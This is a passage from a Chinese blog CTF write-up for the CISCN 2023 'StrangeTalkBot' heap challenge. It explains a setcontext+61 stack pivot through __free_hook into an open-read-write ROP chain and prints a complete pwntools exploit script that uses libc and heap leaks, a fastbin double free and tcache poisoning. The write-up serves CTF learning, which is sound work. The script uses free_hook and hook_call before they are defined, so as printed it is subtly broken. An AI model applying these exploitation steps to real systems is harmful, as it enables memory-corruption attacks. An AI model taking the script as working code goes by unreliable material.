r15,QWORD PTR [rdx+<span class="number">0x60</span>]</span><br><span class="line"><span class="number">0x00007ffff7e279cf</span> &lt;+<span class="number">95</span>&gt;:    test   DWORD PTR fs:<span class="number">0x48</span>,<span class="number">0x2</span></span><br><span class="line"><span class="number">0x00007ffff7e279db</span> &lt;+<span class="number">107</span>&gt;:   je     <span class="number">0x7ffff7e27a96</span> &lt;setcontext+<span class="number">294</span>&gt;</span><br><span class="line">(跳转到setcontext+<span class="number">294</span>)</span><br><span class="line"><span class="number">0x00007ffff7e27a96</span> &lt;+<span class="number">294</span>&gt;:   mov    rcx,QWORD PTR [rdx+<span class="number">0xa8</span>]</span><br><span class="line"><span class="number">0x00007ffff7e27a9d</span> &lt;+<span class="number">301</span>&gt;:   push   rcx</span><br><span class="line"><span class="number">0x00007ffff7e27a9e</span> &lt;+<span class="number">302</span>&gt;:   mov    rsi,QWORD PTR [rdx+<span class="number">0x70</span>]</span><br><span class="line"><span class="number">0x00007ffff7e27aa2</span> &lt;+<span class="number">306</span>&gt;:   mov    rdi,QWORD PTR [rdx+<span class="number">0x68</span>]</span><br><span class="line"><span class="number">0x00007ffff7e27aa6</span> &lt;+<span class="number">310</span>&gt;:   mov    rcx,QWORD PTR [rdx+<span class="number">0x98</span>]</span><br><span class="line"><span class="number">0x00007ffff7e27aad</span> &lt;+<span class="number">317</span>&gt;:   mov    r8,QWORD PTR [rdx+<span class="number">0x28</span>]</span><br><span class="line"><span class="number">0x00007ffff7e27ab1</span> &lt;+<span class="number">321</span>&gt;:   mov    r9,QWORD PTR [rdx+<span class="number">0x30</span>]</span><br><span class="line"><span class="number">0x00007ffff7e27ab5</span> &lt;+<span class="number">325</span>&gt;:   mov    rdx,QWORD PTR [rdx+<span class="number">0x88</span>]</span><br><span class="line"><span class="number">0x00007ffff7e27abc</span> &lt;+<span class="number">332</span>&gt;:   xor    eax,eax</span><br><span class="line"><span class="number">0x00007ffff7e27abe</span> &lt;+<span class="number">334</span>&gt;:   ret</span><br></pre></td></tr></table></figure>
+
+<p>在这道题中, 由于 malloc 的大小是恒定的, 其 rdi 不能由我们控制, 因此我们考虑利用 free 函数, 因为 free 函数的 rdi 是目标堆块的 user data 地址, 只要我们布置好堆块就能够利用</p>
+<p>而 gadgets 的内容是 :</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rdx, [rdi+8]</span><br><span class="line">mov [rsp], rax</span><br><span class="line">call [rdx+0x20]</span><br></pre></td></tr></table></figure>
+
+<p>这也就意味着在触发 free 的时候，参数 rdi 来自的是被 free 的那个指针，因此我们就可以提前在将要 free 的那个 chunk 的 data 区进行布置。当调用 free 时就会 <code>从 [rdi+0x8] 取出一个地址到 rdx；再调用 [rdx+0x20]</code>，<strong>通过这个 gadget 我们可以通过 rdi 控制 rdx , 并通过设置好的 rdx 调用 setcontext+61。</strong></p>
+<p>依旧根据我们上面所说：画一个 chunk28 的 data 域的结构图吧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0x00: &quot;./flag\x00\x00&quot;                      </span><br><span class="line">0x08: p64(fake)                &lt;-- hook_call 取到 rdx</span><br><span class="line">0x10: b&quot;A&quot; * 0x10                           </span><br><span class="line">0x20: p64(setcontext+61)       &lt;-- [rdx+0x20] 被 call</span><br><span class="line">0x28: 0                                   </span><br><span class="line">0x30: 0                                 </span><br><span class="line">...                                         </span><br><span class="line">0x88: 0                                     </span><br><span class="line">...                                         </span><br><span class="line">0xa0: p64(fake + 0xb0)        &lt;-- setcontext: rsp = [rdx+0xa0]</span><br><span class="line">0xa8: p64(ret)                &lt;-- setcontext 最后 ret/jmp 到这里</span><br><span class="line">0xb0: ROP starts here                       │</span><br><span class="line">0xb0: pop rdi ; ret                         │</span><br><span class="line">0xb8: 0                                     │</span><br><span class="line">0xc0: pop rsi ; ret                         │</span><br><span class="line">0xc8: buf                                   │</span><br><span class="line">0xd0: pop rdx ; pop r12 ; ret               │</span><br><span class="line">0xd8: 0x200                                 │</span><br><span class="line">0xe0: 0                                     │</span><br><span class="line">0xe8: read                                  │</span><br><span class="line">... read 第二段 ORW 到 buf ...             </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在 delete 触发 free 的时候</p>
+<ol>
+<li><code>进入 hook_call</code>执行 gadgets</li>
+<li><code>mov rdx, [rdi+0x8]</code>：rdx &#x3D; p64(fake)</li>
+<li><code>call qword ptr [rdx+0x20]</code>：call ptr [setcontext+61] </li>
+<li>执行 setcontext，下面只说最重要的</li>
+<li><code>rsp,QWORD PTR [rdx+0xa0]</code>：rsp &#x3D; p64(fake + 0xb0)</li>
+<li><code>ret</code></li>
+<li>而<code>p64(fake + 0xb0)</code>就是 ORW 链，执行 ORW 获取 flag</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">free(fake_chunk)</span><br><span class="line">      |</span><br><span class="line">      v</span><br><span class="line">  __free_hook = hook_call</span><br><span class="line">      |</span><br><span class="line">      v</span><br><span class="line">  hook_call:</span><br><span class="line">      rdx = *(chunk + 8)</span><br><span class="line">      call qword ptr [rdx + 0x20]</span><br><span class="line">      |</span><br><span class="line">      v</span><br><span class="line">  setcontext+61</span><br><span class="line">      |</span><br><span class="line">      v</span><br><span class="line">  rsp = [rdx + 0xa0]</span><br><span class="line">  ret to [rdx + 0xa8]</span><br><span class="line">      |</span><br><span class="line">      v</span><br><span class="line">  heap rop</span><br></pre></td></tr></table></figure>
+
+<h3 id="总-EXP："><a href="#总-EXP：" class="headerlink" title="总 EXP："></a>总 EXP：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> bot_pb2</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./bot&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/kali/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.18_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line">rop = ROP(libc)</span><br><span class="line">p = process([elf.path])</span><br><span class="line">context(arch=elf.arch, os=elf.os)</span><br><span class="line">context.terminal=[<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> (x &gt;&gt; <span class="number">1</span>) ^ -(x &amp; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_msg</span>(<span class="params">todo, idx, size, con=<span class="string">b&quot;&quot;</span></span>):</span><br><span class="line">    chunk = bot_pb2.pwn()</span><br><span class="line">    chunk.actionid = enc(todo)</span><br><span class="line">    chunk.msgidx = enc(idx * <span class="number">2</span>)</span><br><span class="line">    chunk.msgsize = enc(size)</span><br><span class="line">    chunk.msgcontent = con</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;You can try to have friendly communication with me now: &quot;</span>)</span><br><span class="line">    p.send(chunk.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_chunk</span>(<span class="params">idx, size, con</span>):</span><br><span class="line">    send_msg(<span class="number">2</span>, idx, size + <span class="number">0x10</span>, con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_chunk</span>(<span class="params">idx, size, con</span>):</span><br><span class="line">    send_msg(<span class="number">4</span>, idx, size + <span class="number">0x10</span>, con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_chunk</span>(<span class="params">idx</span>):</span><br><span class="line">    send_msg(<span class="number">6</span>, idx, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_chunk</span>(<span class="params">idx</span>):</span><br><span class="line">    send_msg(<span class="number">8</span>, idx, <span class="number">32</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add_chunk(i, <span class="number">0x100</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete_chunk(i + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">delete_chunk(<span class="number">0</span>)</span><br><span class="line">show_chunk(<span class="number">0</span>)</span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">f&#x27;leak_addr is ==&gt; <span class="subst">&#123;<span class="built_in">hex</span>(leak_addr)&#125;</span>&#x27;</span>)</span><br><span class="line">libc_base =  leak_addr - <span class="number">0x1ecbe0</span></span><br><span class="line">libc.address = libc_base</span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>, <span class="number">17</span>):</span><br><span class="line">    add_chunk(i, <span class="number">0x60</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="number">17</span>):</span><br><span class="line">    delete_chunk(i)</span><br><span class="line"></span><br><span class="line">delete_chunk(<span class="number">8</span>)</span><br><span class="line">delete_chunk(<span class="number">9</span>)</span><br><span class="line">delete_chunk(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>, <span class="number">24</span>):</span><br><span class="line">    add_chunk(i, <span class="number">0x60</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">show_chunk(<span class="number">14</span>)</span><br><span class="line">p.recv()</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x11c0</span></span><br><span class="line">success(<span class="string">&quot;heap_base = &quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>, <span class="number">27</span>):</span><br><span class="line">    add_chunk(i, <span class="number">0x60</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line">add_chunk(<span class="number">27</span>, <span class="number">0x60</span>, p64(hook_call))</span><br><span class="line"></span><br><span class="line">free_hook = libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">setcontext = libc.sym[<span class="string">&quot;setcontext&quot;</span>] + <span class="number">61</span></span><br><span class="line">hook_call = libc_base + <span class="number">0x151bb0</span></span><br><span class="line">pop_rdi = libc_base + rop.find_gadget([<span class="string">&quot;pop rdi&quot;</span>, <span class="string">&quot;ret&quot;</span>]).address</span><br><span class="line">pop_rsi = libc_base + rop.find_gadget([<span class="string">&quot;pop rsi&quot;</span>, <span class="string">&quot;ret&quot;</span>]).address</span><br><span class="line">pop_rdx_r12 = libc_base + rop.find_gadget([<span class="string">&quot;pop rdx&quot;</span>, <span class="string">&quot;pop r12&quot;</span>, <span class="string">&quot;ret&quot;</span>]).address</span><br><span class="line">ret = libc_base + <span class="number">0x22679</span></span><br><span class="line"></span><br><span class="line">fake = heap_base + <span class="number">0x1cf0</span></span><br><span class="line">buf = fake + <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">frame = <span class="string">b&quot;./flag\x00\x00&quot;</span> + p64(fake) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(setcontext)</span><br><span class="line">frame = frame.ljust(<span class="number">0xa0</span>, <span class="string">b&quot;\x00&quot;</span>) + p64(fake + <span class="number">0xb0</span>) + p64(ret)</span><br><span class="line">frame += p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi) + p64(buf)</span><br><span class="line">frame += p64(pop_rdx_r12) + p64(<span class="number">0x200</span>) + p64(<span class="number">0</span>) + p64(libc.sym[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">add_chunk(<span class="number">28</span>, <span class="number">0x1d0</span>, frame)</span><br><span class="line"></span><br><span class="line">delete_chunk(<span class="number">28</span>)</span><br><span class="line"></span><br><span class="line">orw = p64(pop_rdi) + p64(fake) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(libc.sym[<span class="string">&quot;open&quot;</span>])</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(buf) + p64(pop_rdx_r12) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(libc.sym[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(buf) + p64(pop_rdx_r12) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(libc.sym[<span class="string">&quot;write&quot;</span>])</span><br><span class="line">p.send(orw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    data = p.recvuntil(<span class="string">b&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> EOFError:</span><br><span class="line">    data = <span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;rb&quot;</span>).read().rstrip(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/HFTTC.github.io/categories/Notes/" title="Notes" data-aos="zoom-in">Notes</a>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+    <div class="article-nav-link-wrap right">
+          <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="[CISCN 2023] 烧烤摊儿" class="lazyload">
+      <a href="/HFTTC.github.io/2026/06/09/%5BCISCN%202023%5D%20%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF/" aria-label="后一篇: [CISCN 2023] 烧烤摊儿"  title="后一篇: [CISCN 2023] 烧烤摊儿"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          [CISCN 2023] 烧烤摊儿
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+        
+      <h2 class="comment-title">说些什么吧！</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            <div class="selector-item" data-selector="utterances">
+              <span>utterances</span>
+            </div>
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+          <div class="comment utterances-comment" data-aos="fade-up"
+            id="utterances-comment">
+          </div>
+    </div>
+  </section>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      HFTTC
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        237.4k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        19:41
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">程序分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main"><span class="toc-number">1.1.</span> <span class="toc-text">main</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sub-192D"><span class="toc-number">1.2.</span> <span class="toc-text">sub_192D</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sub-a55D"><span class="toc-number">1.3.</span> <span class="toc-text">sub_a55D</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#add"><span class="toc-number">1.4.</span> <span class="toc-text">add</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#delete%EF%BC%9A"><span class="toc-number">1.5.</span> <span class="toc-text">delete：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#show"><span class="toc-number">1.6.</span> <span class="toc-text">show</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#edit%EF%BC%9A"><span class="toc-number">1.7.</span> <span class="toc-text">edit：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">EXP 思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-libc-base"><span class="toc-number">2.1.</span> <span class="toc-text">泄露 libc_base</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fastbin-Double-Free"><span class="toc-number">2.2.</span> <span class="toc-text">Fastbin Double Free</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tcache-Poisoning-%E5%B0%86-free-hook-%E7%94%B3%E8%AF%B7%E5%87%BA%E6%9D%A5"><span class="toc-number">2.3.</span> <span class="toc-text">Tcache_Poisoning 将 __free_hook 申请出来</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-heap-base"><span class="toc-number">2.4.</span> <span class="toc-text">泄露 heap_base</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E7%BD%AE-ORW"><span class="toc-number">2.5.</span> <span class="toc-text">布置 ORW</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#setcontext-61"><span class="toc-number">2.6.</span> <span class="toc-text">setcontext+61</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">总 EXP：</span></a></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">132</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/HFTTC.github.io/images/reimu.png" loading="lazy" decoding="async" fetchpriority="low"/>
+        </div>
+      </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+  
+<script src="/HFTTC.github.io/js/generator_search.js" defer></script>
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "HFTTC",
+          title: "[CISCN 2023]StrangeTalkBot",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/06/09/%5BCISCN%202023%5DStrangeTalkBot/",
+          excerpt: "",
+          description: "",
+          stripContent: "一道 protobuf 序列化的题目，打 setcontext 的方式也比较熟悉，或许打 environ 也可以，没尝试过。    程序分析：main  进到 main 函数，找到该程序反序列化的入口 sub_192D，该函数主要的作用是为了把读进来的原始字节按 protobuf 消息 pwn 解析成一个对象，进去看一看： sub_192D1234char *__fastcall sub_192D(_UNKNOWN **a1, unsigned __int64 n5, unsigned __in",
+          date: "Tue Jun 09 2026 10:25:00 GMT+0800",
+          updated: "Tue Jun 09 2026 20:54:24 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
